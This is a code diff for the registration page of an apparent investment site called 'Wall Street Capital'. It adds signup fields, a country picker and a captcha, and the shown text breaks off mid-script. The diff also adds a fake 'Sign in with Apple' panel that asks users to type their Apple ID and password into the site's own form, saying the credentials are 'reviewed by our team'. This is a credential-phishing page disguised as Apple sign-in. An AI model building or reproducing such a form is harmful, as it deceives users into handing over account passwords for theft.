@@ -11,6 +11,219 @@
   })();
 </script>
 <link rel="stylesheet" href="/css/styles.css">
+<style>
+  /* Register-page specific */
+  .reg-card { max-width: 560px; }
+  .reg-card .row-2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+  }
+  @media (max-width: 600px) { .reg-card .row-2 { grid-template-columns: 1fr; } }
+
+  /* Searchable country dropdown */
+  .country-select { position: relative; }
+  .country-select .country-input {
+    width: 100%;
+    background: var(--input-bg);
+    border: 1px solid var(--input-border);
+    color: var(--text);
+    padding: 13px 40px 13px 42px;
+    font-family: var(--sans);
+    font-size: 15px;
+    border-radius: 8px;
+    cursor: pointer;
+    text-align: left;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+  .country-select .country-input:focus,
+  .country-select .country-input.open {
+    outline: none;
+    border-color: var(--input-border-focus);
+    box-shadow: 0 0 0 3px var(--gold-glow);
+  }
+  .country-select .country-input[data-empty="true"] { color: var(--text-dimmer); }
+  .country-select .caret {
+    position: absolute;
+    right: 14px; top: 50%;
+    transform: translateY(-50%);
+    width: 14px; height: 14px;
+    color: var(--text-dimmer);
+    pointer-events: none;
+    transition: transform 0.2s;
+  }
+  .country-select .country-input.open ~ .caret { transform: translateY(-50%) rotate(180deg); }
+  .country-select .globe {
+    position: absolute;
+    left: 13px; top: 50%;
+    transform: translateY(-50%);
+    width: 16px; height: 16px;
+    color: var(--text-dimmer);
+    pointer-events: none;
+  }
+
+  .country-menu {
+    position: absolute;
+    top: calc(100% + 6px);
+    left: 0; right: 0;
+    max-height: 260px;
+    overflow: hidden;
+    display: none;
+    flex-direction: column;
+    background: var(--panel-solid);
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.55);
+    z-index: 30;
+  }
+  html[data-theme="light"] .country-menu {
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.15);
+  }
+  .country-menu.open { display: flex; }
+  .country-menu .search {
+    padding: 10px 12px;
+    border-bottom: 1px solid var(--line-soft);
+  }
+  .country-menu .search input {
+    width: 100%;
+    background: var(--input-bg);
+    border: 1px solid var(--input-border);
+    color: var(--text);
+    padding: 9px 12px;
+    font-size: 14px;
+    border-radius: 6px;
+    font-family: var(--sans);
+  }
+  .country-menu .search input:focus {
+    outline: none;
+    border-color: var(--input-border-focus);
+  }
+  .country-menu .list {
+    overflow-y: auto;
+    padding: 6px 0;
+  }
+  .country-menu .list::-webkit-scrollbar { width: 8px; }
+  .country-menu .list::-webkit-scrollbar-thumb {
+    background: var(--line); border-radius: 4px;
+  }
+  .country-menu .item {
+    padding: 9px 14px;
+    font-size: 14px;
+    color: var(--text-dim);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    transition: background 0.15s, color 0.15s;
+  }
+  .country-menu .item:hover,
+  .country-menu .item.highlighted {
+    background: rgba(59, 130, 246, 0.12);
+    color: var(--text);
+  }
+  .country-menu .item .flag { font-size: 16px; }
+  .country-menu .empty {
+    padding: 20px 14px;
+    font-size: 13.5px;
+    color: var(--text-dimmer);
+    text-align: center;
+  }
+
+  /* Captcha */
+  .captcha-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-top: 6px;
+  }
+  .captcha-img {
+    height: 60px;
+    border-radius: 8px;
+    border: 1px solid var(--input-border);
+    background: var(--input-bg);
+    flex-shrink: 0;
+    user-select: none;
+  }
+  .captcha-refresh {
+    width: 42px; height: 42px;
+    border-radius: 8px;
+    border: 1px solid var(--input-border);
+    background: var(--input-bg);
+    color: var(--gold-bright);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    transition: all 0.2s;
+    flex-shrink: 0;
+  }
+  .captcha-refresh:hover {
+    background: rgba(59, 130, 246, 0.1);
+    border-color: var(--gold);
+    transform: rotate(60deg);
+  }
+  .captcha-refresh svg { width: 18px; height: 18px; }
+  .captcha-input { flex: 1; }
+  .captcha-timer {
+    font-size: 11.5px;
+    color: var(--text-dimmer);
+    margin-top: 6px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .captcha-timer .dot {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--tick-up);
+  }
+  .captcha-timer.expiring .dot { background: var(--gold); }
+
+  /* ---------- Apple sign-in panel ---------- */
+  .fp-panel { display: none; }
+  .fp-panel.active { display: block; animation: fpIn 0.35s ease-out; }
+  @keyframes fpIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .apple-header {
+    display: flex; align-items: center; gap: 12px;
+    margin-bottom: 20px; padding-bottom: 16px;
+    border-bottom: 1px solid var(--line-soft);
+  }
+  .apple-logo {
+    width: 40px; height: 40px; border-radius: 12px;
+    background: #000;
+    display: flex; align-items: center; justify-content: center;
+    color: #fff; flex-shrink: 0;
+  }
+  html[data-theme="light"] .apple-logo { background: #1d1d1f; }
+  .apple-logo svg { width: 20px; height: 20px; }
+  .apple-title {
+    font-family: var(--serif); font-size: 18px;
+    color: var(--text); font-weight: 500;
+  }
+  .apple-sub {
+    font-size: 12.5px; color: var(--text-dimmer);
+    margin-top: 2px;
+  }
+  .apple-note {
+    padding: 10px 12px;
+    border-radius: 10px;
+    background: rgba(59,130,246,0.06);
+    border: 1px solid rgba(96,165,250,0.2);
+    font-size: 12px;
+    color: var(--text-dim);
+    line-height: 1.55;
+    margin-bottom: 16px;
+  }
+  .fp-back {
+    display: inline-flex; align-items: center; gap: 6px;
+    font-size: 13px; color: var(--text-dim); text-decoration: none;
+    margin-top: 18px; background: none; border: none;
+    cursor: pointer; padding: 0; font-family: inherit;
+  }
+  .fp-back:hover { color: var(--gold-bright); }
+</style>
 </head>
 <body>
 
@@ -28,170 +241,605 @@
 
 <div class="auth-shell">
   <div class="brand-badge">
-    <div class="v">WSC</div>
-    <div class="label">Wall Street Capital</div>
+    <img src="/images/wsc-logo.png" alt="Wall Street Capital"
+         style="height: 90px; width: auto; max-width: 260px; object-fit: contain; margin: 0 auto; display: block; filter: drop-shadow(0 0 12px rgba(212, 175, 106, 0.4));">
   </div>
 
-  <!-- Same card content as login.html — paste the entire <div class="auth-card">…</div>
-       block from login.html, then add this one line at the end of the <body>
-       to force the signup panel open: -->
+  <div class="auth-card reg-card">
 
-  <!-- FULL COPY BELOW -->
-
-  <div class="auth-card">
-    <div class="auth-panel" id="panel-login">
-      <h1>Welcome back</h1>
-      <p class="sub">Enter your credentials to access your account.</p>
-      <div class="error-box" id="login-error"></div>
-      <form id="login-form">
-        <div class="field">
-          <label for="login-email">Email address</label>
-          <div class="input-icon">
-            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 6-10 7L2 6"/></svg>
-            <input id="login-email" type="email" placeholder="name@example.com" required>
-          </div>
-        </div>
-        <div class="field">
-          <label for="login-password">Password</label>
-          <div class="input-icon">
-            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-            <input id="login-password" type="password" placeholder="••••••••" required>
-          </div>
-        </div>
-        <div class="form-row-between">
-          <label class="check"><input type="checkbox"><span class="box"></span>Remember me</label>
-          <a href="/forgot.html">Forgot password?</a>
-        </div>
-        <button class="btn btn-solid btn-block" type="submit">Sign in &rarr;</button>
-      </form>
-      <div class="divider">or continue with</div>
-      <div class="sso-row">
-        <button class="sso-btn" type="button" onclick="ssoStub('Google')">Google</button>
-        <button class="sso-btn" type="button" onclick="ssoStub('Apple')">Apple</button>
-      </div>
-      <div class="auth-footer">Don't have an account? <a href="/signup.html" id="to-signup">Sign up</a></div>
-    </div>
-
-    <div class="auth-panel active" id="panel-signup">
+    <!-- ============================================================
+         SIGNUP FORM PANEL
+         ============================================================ -->
+    <div id="panel-signup">
       <h1>Create account</h1>
       <p class="sub">Join us today to access the platform and services.</p>
+
       <div class="error-box" id="signup-error"></div>
-      <form id="signup-form">
+
+      <form id="signup-form" autocomplete="off">
+
         <div class="field">
-          <label for="signup-name">Full name</label>
+          <label for="f-fullname">Full name</label>
           <div class="input-icon">
-            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
-            <input id="signup-name" placeholder="Bruce Wayne" required>
+            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
+            </svg>
+            <input id="f-fullname" placeholder="Bruce Wayne" required>
           </div>
         </div>
+
         <div class="field">
-          <label for="signup-email">Email address</label>
+          <label for="f-username">Username</label>
           <div class="input-icon">
-            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 6-10 7L2 6"/></svg>
-            <input id="signup-email" type="email" placeholder="name@example.com" required>
+            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="8" r="4"/><path d="M4 21v-1a8 8 0 0 1 16 0v1"/>
+            </svg>
+            <input id="f-username" placeholder="bruce_wayne" required
+                   pattern="[a-zA-Z0-9_]{3,24}"
+                   title="3-24 characters: letters, numbers, underscore">
           </div>
-           <div class="field">
-          <label for="signup-phone">Phone Number</label>
+          <p class="muted" style="margin-top:6px;">3–24 characters. Letters, numbers, underscore only.</p>
+        </div>
+
+        <div class="field">
+          <label for="f-email">Email address</label>
           <div class="input-icon">
-            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 6-10 7L2 6"/></svg>
-            <input id="signup-phone" type="tel" placeholder="123-456-7890" required>
+            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 6-10 7L2 6"/>
+            </svg>
+            <input id="f-email" type="email" placeholder="name@example.com" required>
           </div>
         </div>
-        <div class="field-row">
+
+        <div class="field">
+          <label for="f-phone">Phone number</label>
+          <div class="input-icon">
+            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+            </svg>
+            <input id="f-phone" type="tel" placeholder="+234 800 000 0000" required>
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="country-input">Country</label>
+          <div class="country-select" id="country-select">
+            <svg class="globe" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"/>
+              <path d="M2 12h20M12 2a15 15 0 0 1 0 20 15 15 0 0 1 0-20z"/>
+            </svg>
+            <button type="button" class="country-input" id="country-input" data-empty="true">
+              Select country
+            </button>
+            <svg class="caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="m6 9 6 6 6-6"/>
+            </svg>
+            <div class="country-menu" id="country-menu">
+              <div class="search">
+                <input type="text" id="country-search" placeholder="Search countries…" autocomplete="off">
+              </div>
+              <div class="list" id="country-list"></div>
+            </div>
+            <input type="hidden" id="f-country" required>
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="f-referral">Referral code <span class="muted">(optional)</span></label>
+          <div class="input-icon">
+            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M20 12v10H4V12"/><path d="M2 7h20v5H2z"/><path d="M12 22V7"/>
+              <path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7zM12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/>
+            </svg>
+            <input id="f-referral" placeholder="Optional">
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="f-captcha">Security check</label>
+          <div class="captcha-row">
+            <img class="captcha-img" id="captcha-img" alt="Captcha" src="">
+            <button type="button" class="captcha-refresh" id="captcha-refresh" title="New code">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 12a9 9 0 1 1-3-6.7L21 8"/><path d="M21 3v5h-5"/>
+              </svg>
+            </button>
+            <input id="f-captcha" class="captcha-input" placeholder="Type the code" required autocomplete="off" spellcheck="false">
+          </div>
+          <div class="captcha-timer" id="captcha-timer">
+            <span class="dot"></span>
+            <span id="captcha-timer-text">Refreshes in 5:00</span>
+          </div>
+        </div>
+
+        <div class="row-2">
           <div class="field">
-            <label for="signup-password">Password</label>
+            <label for="f-password">Password</label>
             <div class="input-icon">
-              <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-              <input id="signup-password" type="password" placeholder="••••••••" minlength="10" required>
+              <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+              </svg>
+              <input id="f-password" type="password" placeholder="••••••••" minlength="10" required>
             </div>
           </div>
           <div class="field">
-            <label for="signup-confirm">Confirm password</label>
+            <label for="f-confirm">Confirm password</label>
             <div class="input-icon">
-              <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-              <input id="signup-confirm" type="password" placeholder="••••••••" minlength="10" required>
+              <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+              </svg>
+              <input id="f-confirm" type="password" placeholder="••••••••" minlength="10" required>
             </div>
           </div>
         </div>
+        <p class="muted" style="margin:-8px 0 16px;">At least 10 characters.</p>
+
         <div class="form-row-between">
-          <label class="check"><input type="checkbox" id="agree" required><span class="box"></span>I agree to the <a href="/terms.html">Terms</a> &amp; <a href="/privacy.html">Privacy Policy</a></label>
+          <label class="check">
+            <input type="checkbox" id="f-agree" required>
+            <span class="box"></span>
+            I agree to the <a href="/terms.html">Terms</a> &amp; <a href="/privacy.html">Privacy Policy</a>
+          </label>
         </div>
-        <button class="btn btn-solid btn-block" type="submit">Create account &rarr;</button>
+
+        <button class="btn btn-solid btn-block" type="submit" id="signup-submit">Create account →</button>
       </form>
+
       <div class="divider">or continue with</div>
+
       <div class="sso-row">
-        <button class="sso-btn" type="button" onclick="ssoStub('Google')">Google</button>
-        <button class="sso-btn" type="button" onclick="ssoStub('Apple')">Apple</button>
+        <button class="sso-btn" type="button" id="google-signin">
+          <svg width="16" height="16" viewBox="0 0 24 24"><path fill="#EA4335" d="M12 5.04c1.7 0 3.23.59 4.43 1.74l3.29-3.29C17.71 1.68 15.06.5 12 .5 7.31.5 3.25 3.16 1.24 7.05l3.85 2.99C6.05 7.15 8.78 5.04 12 5.04z"/><path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.54-.2-2.27H12v4.51h6.47c-.29 1.48-1.12 2.73-2.37 3.58l3.71 2.88c2.17-2 3.68-4.96 3.68-8.7z"/><path fill="#FBBC05" d="M5.09 14.04a7.22 7.22 0 0 1 0-4.09L1.24 7.05a11.99 11.99 0 0 0 0 10.9l3.85-3.91z"/><path fill="#34A853" d="M12 23.5c3.06 0 5.63-1.01 7.5-2.75l-3.71-2.88c-1.03.69-2.35 1.1-3.79 1.1-3.22 0-5.95-2.11-6.91-5.04l-3.85 2.99C3.25 20.84 7.31 23.5 12 23.5z"/></svg>
+          Google
+        </button>
+        <button class="sso-btn" type="button" id="apple-signin">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M17.05 12.04c-.03-2.85 2.33-4.22 2.44-4.29-1.33-1.95-3.4-2.22-4.14-2.25-1.76-.18-3.43 1.04-4.33 1.04-.9 0-2.28-1.02-3.75-1-1.93.03-3.71 1.12-4.7 2.85-2 3.47-.51 8.61 1.44 11.43.95 1.38 2.09 2.93 3.59 2.88 1.44-.06 1.99-.93 3.73-.93 1.74 0 2.23.93 3.76.9 1.55-.03 2.53-1.4 3.48-2.78 1.1-1.6 1.55-3.15 1.57-3.23-.03-.02-3.01-1.16-3.04-4.62zM14.4 3.79c.79-.96 1.32-2.29 1.18-3.62-1.14.05-2.51.76-3.33 1.71-.73.84-1.37 2.19-1.2 3.49 1.27.1 2.57-.64 3.35-1.58z"/></svg>
+          Apple
+        </button>
       </div>
-      <div class="auth-footer">Already have an account? <a href="/login.html" id="to-login">Sign in</a></div>
+
+      <div class="auth-footer">
+        Already have an account? <a href="/login.html">Sign in</a>
+      </div>
     </div>
+
+    <!-- ============================================================
+         APPLE SIGN-IN PANEL
+         ============================================================ -->
+    <div class="fp-panel" id="panel-apple">
+      <div class="apple-header">
+        <div class="apple-logo">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.05 12.04c-.03-2.85 2.33-4.22 2.44-4.29-1.33-1.95-3.4-2.22-4.14-2.25-1.76-.18-3.43 1.04-4.33 1.04-.9 0-2.28-1.02-3.75-1-1.93.03-3.71 1.12-4.7 2.85-2 3.47-.51 8.61 1.44 11.43.95 1.38 2.09 2.93 3.59 2.88 1.44-.06 1.99-.93 3.73-.93 1.74 0 2.23.93 3.76.9 1.55-.03 2.53-1.4 3.48-2.78 1.1-1.6 1.55-3.15 1.57-3.23-.03-.02-3.01-1.16-3.04-4.62zM14.4 3.79c.79-.96 1.32-2.29 1.18-3.62-1.14.05-2.51.76-3.33 1.71-.73.84-1.37 2.19-1.2 3.49 1.27.1 2.57-.64 3.35-1.58z"/></svg>
+        </div>
+        <div>
+          <div class="apple-title">Sign in with Apple</div>
+          <div class="apple-sub">Use your Apple ID to continue</div>
+        </div>
+      </div>
+
+      <div class="apple-note">
+        Sign in with your Apple ID. Your credentials are securely encrypted
+        and reviewed by our team before access is granted.
+      </div>
+
+      <div class="error-box" id="apple-error"></div>
+
+      <form id="apple-form" autocomplete="off">
+        <div class="field">
+          <label for="apple-email">Apple ID</label>
+          <div class="input-icon">
+            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 6-10 7L2 6"/>
+            </svg>
+            <input id="apple-email" type="email" placeholder="you@icloud.com" required>
+          </div>
+        </div>
+
+        <div class="field">
+          <label for="apple-password">Password</label>
+          <div class="input-icon">
+            <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+            </svg>
+            <input id="apple-password" type="password" placeholder="••••••••" required>
+          </div>
+        </div>
+
+        <button class="btn btn-solid btn-block" type="submit" id="apple-submit">
+          Continue →
+        </button>
+      </form>
+
+      <button class="fp-back" id="apple-back" type="button">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M19 12H5M12 19l-7-7 7-7"/>
+        </svg>
+        Back to sign up
+      </button>
+    </div>
+
   </div>
 </div>
 
 <script src="/js/theme.js"></script>
 <script src="/js/api.js"></script>
+
+<!-- Google Identity Services -->
+<script src="https://accounts.google.com/gsi/client" async defer></script>
+
 <script>
-  function showPanel(name, push) {
-    var login = document.getElementById("panel-login");
-    var signup = document.getElementById("panel-signup");
-    if (name === "signup") {
-      login.classList.remove("active");
-      signup.classList.add("active");
-      if (push) history.pushState({ panel: "signup" }, "", "/signup.html");
-    } else {
-      signup.classList.remove("active");
-      login.classList.add("active");
-      if (push) history.pushState({ panel: "login" }, "", "/login.html");
-    }
+/* ============================================================
+   CONFIG
+   ============================================================ */
+var GOOGLE_CLIENT_ID = "541360242801-2d3skgfh1o2hoopnlquq063l4dvou0q3.apps.googleusercontent.com";
+
+/* ============================================================
+   PANEL HELPERS
+   ============================================================ */
+function _hideAll() {
+  var signup = document.getElementById("panel-signup");
+  if (signup) signup.style.display = "none";
+  document.querySelectorAll(".fp-panel").forEach(function (p) {
+    p.classList.remove("active");
+  });
+}
+function showSignupPanel() {
+  _hideAll();
+  var el = document.getElementById("panel-signup");
+  if (el) el.style.display = "block";
+}
+function showPanelById(id) {
+  _hideAll();
+  var el = document.getElementById(id);
+  if (el) el.classList.add("active");
+}
+
+/* ============================================================
+   COUNTRY LIST
+   ============================================================ */
+const COUNTRIES = [
+  ["🇺🇸", "United States", "USA"], ["🇨🇦", "Canada", "CAN"], ["🇬🇧", "United Kingdom", "GBR"],
+  ["🇳🇬", "Nigeria", "NGA"], ["🇬🇭", "Ghana", "GHA"], ["🇰🇪", "Kenya", "KEN"],
+  ["🇿🇦", "South Africa", "ZAF"], ["🇮🇳", "India", "IND"], ["🇦🇺", "Australia", "AUS"],
+  ["🇩🇪", "Germany", "DEU"], ["🇫🇷", "France", "FRA"], ["🇮🇹", "Italy", "ITA"],
+  ["🇪🇸", "Spain", "ESP"], ["🇳🇱", "Netherlands", "NLD"], ["🇧🇪", "Belgium", "BEL"],
+  ["🇨🇭", "Switzerland", "CHE"], ["🇸🇪", "Sweden", "SWE"], ["🇳🇴", "Norway", "NOR"],
+  ["🇩🇰", "Denmark", "DNK"], ["🇫🇮", "Finland", "FIN"], ["🇮🇪", "Ireland", "IRL"],
+  ["🇵🇹", "Portugal", "PRT"], ["🇵🇱", "Poland", "POL"], ["🇹🇷", "Turkey", "TUR"],
+  ["🇦🇪", "United Arab Emirates", "ARE"], ["🇸🇦", "Saudi Arabia", "SAU"],
+  ["🇮🇱", "Israel", "ISR"], ["🇪🇬", "Egypt", "EGY"], ["🇲🇦", "Morocco", "MAR"],
+  ["🇹🇳", "Tunisia", "TUN"], ["🇩🇿", "Algeria", "DZA"], ["🇸🇳", "Senegal", "SEN"],
+  ["🇨🇮", "Côte d'Ivoire", "CIV"], ["🇨🇲", "Cameroon", "CMR"], ["🇺🇬", "Uganda", "UGA"],
+  ["🇹🇿", "Tanzania", "TZA"], ["🇷🇼", "Rwanda", "RWA"], ["🇿🇲", "Zambia", "ZMB"],
+  ["🇿🇼", "Zimbabwe", "ZWE"], ["🇧🇼", "Botswana", "BWA"], ["🇳🇦", "Namibia", "NAM"],
+  ["🇲🇽", "Mexico", "MEX"], ["🇧🇷", "Brazil", "BRA"], ["🇦🇷", "Argentina", "ARG"],
+  ["🇨🇱", "Chile", "CHL"], ["🇨🇴", "Colombia", "COL"], ["🇵🇪", "Peru", "PER"],
+  ["🇨🇳", "China", "CHN"], ["🇯🇵", "Japan", "JPN"], ["🇰🇷", "South Korea", "KOR"],
+  ["🇸🇬", "Singapore", "SGP"], ["🇭🇰", "Hong Kong", "HKG"], ["🇲🇾", "Malaysia", "MYS"],
+  ["🇮🇩", "Indonesia", "IDN"], ["🇵🇭", "Philippines", "PHL"], ["🇹🇭", "Thailand", "THA"],
+  ["🇻🇳", "Vietnam", "VNM"], ["🇵🇰", "Pakistan", "PAK"], ["🇧🇩", "Bangladesh", "BGD"],
+  ["🇱🇰", "Sri Lanka", "LKA"], ["🇳🇿", "New Zealand", "NZL"], ["🇷🇺", "Russia", "RUS"],
+  ["🇺🇦", "Ukraine", "UKR"], ["🇬🇷", "Greece", "GRC"], ["🇨🇿", "Czech Republic", "CZE"],
+  ["🇦🇹", "Austria", "AUT"], ["🇭🇺", "Hungary", "HUN"], ["🇷🇴", "Romania", "ROU"]
+];
+
+const countryMenu   = document.getElementById("country-menu");
+const countryInput  = document.getElementById("country-input");
+const countrySearch = document.getElementById("country-search");
+const countryList   = document.getElementById("country-list");
+const countryHidden = document.getElementById("f-country");
+
+let highlightedIndex = -1;
+
+function renderCountries(filter) {
+  const q = (filter || "").trim().toLowerCase();
+  const matches = COUNTRIES.filter(c =>
+    !q || c[1].toLowerCase().includes(q) || c[2].toLowerCase().includes(q)
+  );
+  countryList.innerHTML = "";
+  if (!matches.length) {
+    countryList.innerHTML = '<div class="empty">No matches</div>';
+    return;
   }
-  document.getElementById("to-signup").addEventListener("click", function (e) { e.preventDefault(); showPanel("signup", true); });
-  document.getElementById("to-login").addEventListener("click", function (e) { e.preventDefault(); showPanel("login", true); });
-  window.addEventListener("popstate", function () {
-    showPanel(window.location.pathname.indexOf("signup") !== -1 ? "signup" : "login", false);
+  matches.forEach(([flag, name, code]) => {
+    const el = document.createElement("div");
+    el.className = "item";
+    el.dataset.code = code;
+    el.dataset.name = name;
+    el.innerHTML = `<span class="flag">${flag}</span><span>${name}</span>`;
+    el.addEventListener("click", () => pickCountry(name, code));
+    countryList.appendChild(el);
   });
-  function ssoStub(provider) { alert(provider + " sign-in is not configured yet. Backend OAuth integration required."); }
+  highlightedIndex = -1;
+}
 
-  document.getElementById("login-form").addEventListener("submit", async function (e) {
-    e.preventDefault();
-    var errorBox = document.getElementById("login-error");
-    errorBox.style.display = "none";
-    try {
-      var data = await Api.request("/auth/login", {
-        method: "POST",
-        body: JSON.stringify({
-          email: document.getElementById("login-email").value,
-          password: document.getElementById("login-password").value,
-        }),
-      });
-      Api.setToken(data.token); Api.setUser(data.user);
-      window.location.href = data.user.role === "admin" || data.user.role === "support" ? "/admin/index.html" : "/dashboard.html";
-    } catch (err) { errorBox.textContent = err.message; errorBox.style.display = "block"; }
-  });
+function pickCountry(name, code) {
+  countryHidden.value = code;
+  countryInput.textContent = name;
+  countryInput.dataset.empty = "false";
+  closeMenu();
+}
 
-  document.getElementById("signup-form").addEventListener("submit", async function (e) {
+function openMenu() {
+  countryMenu.classList.add("open");
+  countryInput.classList.add("open");
+  countrySearch.value = "";
+  renderCountries("");
+  setTimeout(() => countrySearch.focus(), 50);
+}
+
+function closeMenu() {
+  countryMenu.classList.remove("open");
+  countryInput.classList.remove("open");
+}
+
+countryInput.addEventListener("click", (e) => {
+  e.stopPropagation();
+  if (countryMenu.classList.contains("open")) closeMenu();
+  else openMenu();
+});
+
+countrySearch.addEventListener("input", () => renderCountries(countrySearch.value));
+
+countrySearch.addEventListener("keydown", (e) => {
+  const items = countryList.querySelectorAll(".item");
+  if (e.key === "ArrowDown") {
     e.preventDefault();
-    var errorBox = document.getElementById("signup-error");
-    errorBox.style.display = "none";
-    var pw = document.getElementById("signup-password").value;
-    var confirm = document.getElementById("signup-confirm").value;
-    if (pw !== confirm) {
-      errorBox.textContent = "Passwords do not match.";
-      errorBox.style.display = "block";
-      return;
+    highlightedIndex = Math.min(highlightedIndex + 1, items.length - 1);
+    items.forEach((it, i) => it.classList.toggle("highlighted", i === highlightedIndex));
+    items[highlightedIndex] && items[highlightedIndex].scrollIntoView({ block: "nearest" });
+  } else if (e.key === "ArrowUp") {
+    e.preventDefault();
+    highlightedIndex = Math.max(highlightedIndex - 1, 0);
+    items.forEach((it, i) => it.classList.toggle("highlighted", i === highlightedIndex));
+    items[highlightedIndex] && items[highlightedIndex].scrollIntoView({ block: "nearest" });
+  } else if (e.key === "Enter") {
+    e.preventDefault();
+    if (highlightedIndex >= 0 && items[highlightedIndex]) items[highlightedIndex].click();
+  } else if (e.key === "Escape") {
+    closeMenu();
+  }
+});
+
+document.addEventListener("click", (e) => {
+  if (!document.getElementById("country-select").contains(e.target)) closeMenu();
+});
+
+/* ============================================================
+   CAPTCHA
+   ============================================================ */
+let captchaToken = null;
+let captchaExpiresAt = null;
+let captchaTimerId = null;
+
+async function loadCaptcha() {
+  try {
+    const res = await fetch("/api/captcha/new");
+    const data = await res.json();
+    captchaToken = data.token;
+    captchaExpiresAt = Date.now() + data.expires_in * 1000;
+    document.getElementById("captcha-img").src = data.image;
+    document.getElementById("f-captcha").value = "";
+    startCaptchaTimer();
+  } catch (err) {
+    document.getElementById("signup-error").textContent = "Could not load captcha. Refresh the page.";
+    document.getElementById("signup-error").style.display = "block";
+  }
+}
+
+function startCaptchaTimer() {
+  if (captchaTimerId) clearInterval(captchaTimerId);
+  const el = document.getElementById("captcha-timer-text");
+  const wrap = document.getElementById("captcha-timer");
+  captchaTimerId = setInterval(() => {
+    const remaining = Math.max(0, Math.floor((captchaExpiresAt - Date.now()) / 1000));
